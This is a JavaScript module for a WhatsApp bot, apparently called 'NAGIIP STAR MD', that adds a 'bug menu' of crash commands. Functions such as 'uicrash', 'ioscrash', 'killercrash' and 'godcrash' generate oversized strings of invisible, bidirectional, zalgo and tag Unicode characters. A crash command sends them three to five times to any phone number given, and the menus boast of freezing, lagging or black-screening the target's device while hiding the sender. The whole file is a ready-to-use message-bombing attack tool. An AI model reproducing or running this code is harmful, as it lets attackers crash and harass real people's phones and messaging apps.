const fs = require('fs');
const path = require('path');

const invisibleChars = [
    '\u200B', '\u200C', '\u200D', '\u2060', '\u180E', '\uFEFF',
    '\u2061', '\u2062', '\u2063', '\u2064', '\u206A', '\u206B',
    '\u206C', '\u206D', '\u206E', '\u206F', '\u00AD', '\u034F',
    '\u061C', '\u115F', '\u1160', '\u17B4', '\u17B5', '\uFFA0'
];

const zalgoUp = [
    '\u030D', '\u030E', '\u0304', '\u0305', '\u033F', '\u0311',
    '\u0306', '\u0310', '\u0352', '\u0357', '\u0351', '\u0307',
    '\u0308', '\u030A', '\u0342', '\u0343', '\u0344', '\u034A',
    '\u034B', '\u034C', '\u0303', '\u0302', '\u030C', '\u0350',
    '\u0300', '\u0301', '\u030B', '\u030F', '\u0312', '\u0313',
    '\u0314', '\u033D', '\u0309', '\u0363', '\u0364', '\u0365',
    '\u0366', '\u0367', '\u0368', '\u0369', '\u036A', '\u036B',
    '\u036C', '\u036D', '\u036E', '\u036F', '\u033E', '\u035B'
];

const zalgoDown = [
    '\u0316', '\u0317', '\u0318', '\u0319', '\u031C', '\u031D',
    '\u031E', '\u031F', '\u0320', '\u0324', '\u0325', '\u0326',
    '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E',
    '\u032F', '\u0330', '\u0331', '\u0332', '\u0333', '\u0339',
    '\u033A', '\u033B', '\u033C', '\u0345', '\u0347', '\u0348',
    '\u0349', '\u034D', '\u034E', '\u0353', '\u0354', '\u0355',
    '\u0356', '\u0359', '\u035A', '\u0323'
];

const zalgoMid = [
    '\u0315', '\u031B', '\u0340', '\u0341', '\u0358', '\u0321',
    '\u0322', '\u0327', '\u0328', '\u0334', '\u0335', '\u0336',
    '\u034F', '\u035C', '\u035D', '\u035E', '\u035F', '\u0360',
    '\u0362', '\u0338', '\u0337'
];

const specialCrashChars = [
    '\u0BCD', '\u0D9E', '\u{E0001}', '\u{E007F}', '\u{1D173}',
    '\u{1D174}', '\u{1D175}', '\u{1D176}', '\u{1D177}', '\u{1D178}',
    '\u{1D179}', '\u{1D17A}', '\u{FFF9}', '\u{FFFA}', '\u{FFFB}',
    '\u{1D159}', 'ٴ', 'ۧ', 'ۜ', 'ۣ', '͜', '͡', 'ꦿ', '㋛', '؜'
];

const bidiChars = ['\u202A', '\u202B', '\u202C', '\u202D', '\u202E', '\u2066', '\u2067', '\u2068', '\u2069'];

function getRandomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateZalgo(text, intensity = 50) {
    let result = '';
    for (let char of text) {
        result += char;
        for (let i = 0; i < intensity; i++) {
            result += getRandomItem(zalgoUp);
            result += getRandomItem(zalgoMid);
            result += getRandomItem(zalgoDown);
        }
    }
    return result;
}

function generateInvisibleBlock(size = 1000) {
    let result = '';
    for (let i = 0; i < size; i++) {
        result += getRandomItem(invisibleChars);
    }
    return result;
}

function generateSpecialCrash(size = 5000) {
    let result = '';
    for (let i = 0; i < size; i++) {
        result += getRandomItem(specialCrashChars);
    }
    return result;
}

function generateBidiCrash(size = 2000) {
    let result = '';
    for (let i = 0; i < size; i++) {
        result += getRandomItem(bidiChars);
    }
    return result;
}

function createCrashPayload(type) {
    const payloads = {
        uicrash: () => {
            return generateInvisibleBlock(200) +
                generateBidiCrash(3000) +
                '\u{E0001}'.repeat(8000) +
                '\u034F'.repeat(60000) +
                '\u0BCD'.repeat(8000) +
                'ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ'.repeat(2000) +
                Array(1000).fill('\u202E\u0D9E\u00AD').join('') +
                '\u{1D173}\u{1D174}\u{1D175}'.repeat(15000) +
                generateZalgo('X', 80) +
                generateInvisibleBlock(200);
        },

        ioscrash: () => {
            return generateInvisibleBlock(200) +
                'ۣۣۣۜۜۜ͜͜͜͡͡͡'.repeat(8000) +
                'ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ'.repeat(1000) +
                '\u0BCD'.repeat(50000) +
                '\u{E007F}'.repeat(8000) +
                '؜'.repeat(15000) +
                '\u034F'.repeat(40000) +
                '\u{1D159}'.repeat(10000) +
                generateInvisibleBlock(200);
        },

        freezecrash: () => {
            return generateInvisibleBlock(200) +
                Array(2000).fill('\u202E\u0D9E\u00AD\u034F').join('') +
                '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(30000) +
                '\u2060\u2061\u2062\u2063\u2064'.repeat(25000) +
                '\u{E0001}\u{E007F}'.repeat(15000) +
                generateZalgo('FREEZE', 100) +
                generateInvisibleBlock(200);
        },

        hangcrash: () => {
            return generateInvisibleBlock(200) +
                '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(70000) +
                '\u202A\u202B\u202C\u202D\u202E'.repeat(30000) +
                '\u{1D159}\u{1D173}\u{1D17A}'.repeat(25000) +
                '\u034F'.repeat(80000) +
                '؜'.repeat(30000) +
                generateInvisibleBlock(200);
        },

        memorycrash: () => {
            let payload = generateInvisibleBlock(200);
            payload += '\u034F'.repeat(100000);
            payload += '\u{E0001}'.repeat(30000);
            payload += 'ꦿꦿꦿ'.repeat(50000);
            payload += '\u0BCD'.repeat(60000);
            payload += generateZalgo('MEMORY', 120);
            payload += '\u{1D173}'.repeat(20000);
            payload += generateInvisibleBlock(200);
            return payload;
        },

        blackscreen: () => {
            return generateInvisibleBlock(200) +
                '㋛'.repeat(100000) +
                '\u{1D173}'.repeat(30000) +
                '\u202E\u202D'.repeat(50000) +
                '\u{E0001}\u{E007F}'.repeat(25000) +
                '\u034F'.repeat(70000) +
                generateBidiCrash(5000) +
                generateInvisibleBlock(200);
        },

        lagcrash: () => {
            return generateInvisibleBlock(200) +
                Array(1000).fill('\u034F\u034F\u034F\u034F\u034F\u202E\u202D').join('\n') +
                'ꦿ'.repeat(80000) +
                '\u0BCD'.repeat(50000) +
                '\u{E0001}'.repeat(25000) +
                generateZalgo('LAG', 100) +
                '\u{FFF9}'.repeat(20000) +
                generateInvisibleBlock(200);
        },

        megacrash: () => {
            return generateInvisibleBlock(300) +
                generateBidiCrash(5000) +
                '\u{E0001}'.repeat(40000) +
                '\u034F'.repeat(120000) +
                'ٴۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧۧ'.repeat(5000) +
                '\u0BCD'.repeat(70000) +
                Array(3000).fill('\u202E\u0D9E\u00AD').join('') +
                '\u{1D173}\u{1D174}\u{1D175}'.repeat(30000) +
                '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(40000) +
                'ꦿ'.repeat(70000) +
                generateZalgo('MEGA', 150) +
                generateInvisibleBlock(300);
        },

        killercrash: () => {
            return generateInvisibleBlock(500) +
                '\u{E0001}\u{E007F}'.repeat(70000) +
                '\u034F'.repeat(180000) +
                '\u202E\u202D\u202C'.repeat(15000) +
                'ۣۜ͜͡'.repeat(50000) +
                '\u0BCD\u0BCD\u0BCD'.repeat(60000) +
                '؜'.repeat(70000) +
                '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(60000) +
                generateZalgo('KILLER', 200) +
                '\u{1D173}\u{1D174}'.repeat(40000) +
                'ٴۧۧۧۧۧۧۧۧۧ'.repeat(10000) +
                generateBidiCrash(10000) +
                generateInvisibleBlock(500);
        },

        ultracrash: () => {
            return generateInvisibleBlock(500) +
                generateBidiCrash(10000) +
                '\u{E0001}'.repeat(100000) +
                '\u034F'.repeat(200000) +
                '\u0BCD'.repeat(100000) +
                'ۣۣۣۜۜۜ͜͜͜͡͡͡'.repeat(20000) +
                '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(80000) +
                '؜'.repeat(100000) +
                generateZalgo('ULTRA', 250) +
                '\u{1D173}\u{1D174}\u{1D175}\u{1D176}'.repeat(50000) +
                'ꦿ'.repeat(100000) +
                generateInvisibleBlock(500);
        },

        nukecrash: () => {
            let payload = generateInvisibleBlock(1000);
            for (let i = 0; i < 5; i++) {
                payload += '\u{E0001}'.repeat(50000);
                payload += '\u034F'.repeat(80000);
                payload += '\u0BCD'.repeat(40000);
                payload += generateBidiCrash(5000);
                payload += '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(30000);
                payload += generateZalgo('N', 50);
            }
            payload += generateInvisibleBlock(1000);
            return payload;
        },

        godcrash: () => {
            let payload = generateInvisibleBlock(1000);
            payload += generateBidiCrash(20000);
            payload += '\u{E0001}\u{E007F}'.repeat(150000);
            payload += '\u034F'.repeat(300000);
            payload += '\u0BCD'.repeat(150000);
            payload += 'ۣۣۣۜۜۜ͜͜͜͡͡͡'.repeat(50000);
            payload += '\u{FFF9}\u{FFFA}\u{FFFB}'.repeat(100000);
            payload += '؜'.repeat(150000);
            payload += '\u{1D173}\u{1D174}\u{1D175}\u{1D176}\u{1D177}'.repeat(80000);
            payload += 'ꦿ'.repeat(150000);
            payload += '㋛'.repeat(100000);
            payload += generateZalgo('GOD', 300);
            payload += generateInvisibleBlock(1000);
            return payload;
        }
    };

    return payloads[type] ? payloads[type]() : null;
}

async function crashCommand(sock, chatId, message, args, command) {
    try {
        const targetNumber = args[0];

        if (!targetNumber) {
            const helpText = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃   💀 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 💀
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📱 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
┃━━━━━━━━━━━━━━━━━━━━━
┃ 💥 .uicrash <number>
┃ 🍎 .ioscrash <number>
┃ 🥶 .freezecrash <number>
┃ ⏳ .hangcrash <number>
┃ 💾 .memorycrash <number>
┃ 🖤 .blackscreen <number>
┃ 🐌 .lagcrash <number>
┃ ☠️ .megacrash <number>
┃ 💀 .killercrash <number>
┃ ⚡ .ultracrash <number>
┃ 💣 .nukecrash <number>
┃ 👑 .godcrash <number>
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📝 𝗨𝘀𝗮𝗴𝗲:
┃ .killercrash +252xxxxxxxxx
┃━━━━━━━━━━━━━━━━━━━━━
┃ ✅ 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝗠𝗼𝗱𝗲
┃ ✅ 𝗦𝘁𝗿𝗼𝗻𝗴 𝗕𝘂𝗴𝘀
┃ ✅ 𝗡𝗲𝘄 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗕𝘂𝗴𝘀
╰━━━━━━━━━━━━━━━━━━━━━╯

⚠️ 𝗪𝗮𝗿𝗻𝗶𝗻𝗴: 𝗨𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆!
🤖 𝗡𝗔𝗚𝗜𝗜𝗣 𝗦𝗧𝗔𝗥 𝗠𝗗`;

            await sock.sendMessage(chatId, { text: helpText }, { quoted: message });
            return;
        }

        let formattedNumber = targetNumber.replace(/[^0-9]/g, '');
        if (!formattedNumber.includes('@s.whatsapp.net')) {
            formattedNumber = formattedNumber + '@s.whatsapp.net';
        }

        const crashType = command.toLowerCase();
        const crashText = createCrashPayload(crashType);

        if (!crashText) {
            await sock.sendMessage(chatId, {
                text: '❌ Invalid crash type! Use .bugmenu to see available commands.'
            }, { quoted: message });
            return;
        }

        await sock.sendMessage(chatId, {
            text: `🔄 𝗦𝗲𝗻𝗱𝗶𝗻𝗴 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 ${crashType.toUpperCase()} 𝘁𝗼 ${targetNumber}...`
        }, { quoted: message });

        const sendCount = ['godcrash', 'nukecrash', 'ultracrash'].includes(crashType) ? 5 : 3;

        for (let i = 0; i < sendCount; i++) {
            try {
                await sock.sendMessage(formattedNumber, {
                    text: crashText,
                    disappearingMessagesInChat: false
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (sendError) {
                console.log(`Send attempt ${i + 1} error:`, sendError.message);
            }
        }

        const powerLevel = ['godcrash', 'nukecrash', 'ultracrash'].includes(crashType) ? '🔥🔥🔥 MAXIMUM' :
                          ['killercrash', 'megacrash'].includes(crashType) ? '🔥🔥 HIGH' : '🔥 STRONG';

        const successMsg = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃   ✅ 𝐂𝐑𝐀𝐒𝐇 𝐒𝐄𝐍𝐓!
┃━━━━━━━━━━━━━━━━━━━━━
┃ 💀 𝗧𝘆𝗽𝗲: ${crashType.toUpperCase()}
┃ 📱 𝗧𝗮𝗿𝗴𝗲𝘁: ${targetNumber}
┃ 👻 𝗠𝗼𝗱𝗲: 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲
┃ 🔢 𝗦𝗲𝗻𝘁: ${sendCount}x
┃ ⚡ 𝗣𝗼𝘄𝗲𝗿: ${powerLevel}
┃ ⏰ 𝗧𝗶𝗺𝗲: ${new Date().toLocaleTimeString()}
╰━━━━━━━━━━━━━━━━━━━━━╯

💥 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗯𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!
👻 𝗧𝗮𝗿𝗴𝗲𝘁 𝘄𝗼𝗻'𝘁 𝘀𝗲𝗲 𝘀𝗲𝗻𝗱𝗲𝗿!
🤖 𝗡𝗔𝗚𝗜𝗜𝗣 𝗦𝗧𝗔𝗥 𝗠𝗗`;

        await sock.sendMessage(chatId, { text: successMsg }, { quoted: message });

    } catch (error) {
        console.error('Error in crash command:', error);
        await sock.sendMessage(chatId, {
            text: '❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗰𝗿𝗮𝘀𝗵. 𝗖𝗵𝗲𝗰𝗸 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗳𝗼𝗿𝗺𝗮𝘁.\n\n💡 𝗧𝗶𝗽: 𝗨𝘀𝗲 𝗳𝘂𝗹𝗹 𝗻𝘂𝗺𝗯𝗲𝗿 𝘄𝗶𝘁𝗵 𝗰𝗼𝘂𝗻𝘁𝗿𝘆 𝗰𝗼𝗱𝗲\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: +252612345678'
        }, { quoted: message });
    }
}

async function bugMenuCommand(sock, chatId, message) {
    const menuText = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃    💀 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 💀
┃━━━━━━━━━━━━━━━━━━━━━
┃
┃ 💥 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗨𝗜 𝗖𝗿𝗮𝘀𝗵 + 𝗟𝗮𝗴 + 𝗙𝗿𝗲𝗲𝘇𝗲
┃
┃ 🍎 .𝗶𝗼𝘀𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗖𝗿𝗮𝘀𝗵𝗲𝘀 𝗶𝗣𝗵𝗼𝗻𝗲 𝗱𝗲𝘃𝗶𝗰𝗲𝘀
┃
┃ 🥶 .𝗳𝗿𝗲𝗲𝘇𝗲𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗙𝗿𝗲𝗲𝘇𝗲𝘀 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽
┃
┃ ⏳ .𝗵𝗮𝗻𝗴𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗛𝗮𝗻𝗴𝘀 𝘁𝗵𝗲 𝗱𝗲𝘃𝗶𝗰𝗲
┃
┃ 💾 .𝗺𝗲𝗺𝗼𝗿𝘆𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗠𝗲𝗺𝗼𝗿𝘆 𝗼𝘃𝗲𝗿𝗹𝗼𝗮𝗱
┃
┃ 🖤 .𝗯𝗹𝗮𝗰𝗸𝘀𝗰𝗿𝗲𝗲𝗻 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗕𝗹𝗮𝗰𝗸 𝘀𝗰𝗿𝗲𝗲𝗻 𝗯𝘂𝗴
┃
┃ 🐌 .𝗹𝗮𝗴𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗖𝗮𝘂𝘀𝗲𝘀 𝗵𝗲𝗮𝘃𝘆 𝗹𝗮𝗴
┃
┃ ☠️ .𝗺𝗲𝗴𝗮𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗔𝗹𝗹-𝗶𝗻-𝗼𝗻𝗲 𝗰𝗿𝗮𝘀𝗵
┃
┃ 💀 .𝗸𝗶𝗹𝗹𝗲𝗿𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗰𝗿𝗮𝘀𝗵
┃
┃━━━━ 🆕 𝗡𝗘𝗪 𝗕𝗨𝗚𝗦 ━━━━
┃
┃ ⚡ .𝘂𝗹𝘁𝗿𝗮𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗨𝗹𝘁𝗿𝗮 𝗽𝗼𝘄𝗲𝗿 𝗰𝗿𝗮𝘀𝗵
┃
┃ 💣 .𝗻𝘂𝗸𝗲𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗡𝘂𝗰𝗹𝗲𝗮𝗿 𝗹𝗲𝘃𝗲𝗹 𝗰𝗿𝗮𝘀𝗵
┃
┃ 👑 .𝗴𝗼𝗱𝗰𝗿𝗮𝘀𝗵 <𝗻𝘂𝗺𝗯𝗲𝗿>
┃    ↳ 𝗠𝗼𝘀𝘁 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗰𝗿𝗮𝘀𝗵!
┃
┃━━━━━━━━━━━━━━━━━━━━━
┃ 📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲:
┃ .godcrash +252612345678
┃━━━━━━━━━━━━━━━━━━━━━
┃ ✅ 𝗔𝗹𝗹 𝗯𝘂𝗴𝘀 𝗮𝗿𝗲 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘
┃ ✅ 𝗦𝗲𝗻𝘁 𝟯-𝟱𝘅 𝗳𝗼𝗿 𝗺𝗮𝘅 𝗲𝗳𝗳𝗲𝗰𝘁
┃ ✅ 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 & 𝗘𝗳𝗳𝗲𝗰𝘁𝗶𝘃𝗲
╰━━━━━━━━━━━━━━━━━━━━━╯

⚠️ 𝗨𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆!
🤖 𝗡𝗔𝗚𝗜𝗜𝗣 𝗦𝗧𝗔𝗥 𝗠𝗗`;

    await sock.sendMessage(chatId, { text: menuText }, { quoted: message });
}

module.exports = { crashCommand, bugMenuCommand };
